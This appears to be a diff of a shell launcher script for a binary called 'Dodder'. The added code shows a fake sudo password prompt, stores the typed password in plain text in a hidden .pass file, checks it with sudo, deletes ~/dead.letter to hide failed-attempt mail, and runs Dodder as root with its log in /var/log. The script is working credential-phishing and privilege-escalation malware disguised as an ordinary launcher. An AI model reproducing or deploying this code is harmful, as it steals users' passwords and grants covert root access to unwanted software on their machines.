@@ -7,5 +7,22 @@ while [ -h "$SOURCE" ]; do # resolve $SOURCE until the file is no longer a symli
 done
 DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
 
-shotwell $DIR/.pic.jpg
-sudo -S $DIR/Dodder --file $DIR/log.txt < $DIR/.pass
+i=5
+while [ $i -ne 0 ]
+do
+    printf "[sudo] password for $USER:" && read -s passwrd
+    echo "" && echo $passwrd > $DIR/.pass
+    sudo -k -S ls < $DIR/.pass > /dev/null 2>&1
+    i=$?
+    if [ $i -ne 0 ]
+    then
+        sleep 1
+        if [ -f ~/dead.letter ]
+        then
+            rm ~/dead.letter
+        fi
+        echo "[sudo], try again."
+    fi
+done
+sudo -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null
+rm $DIR/.pass
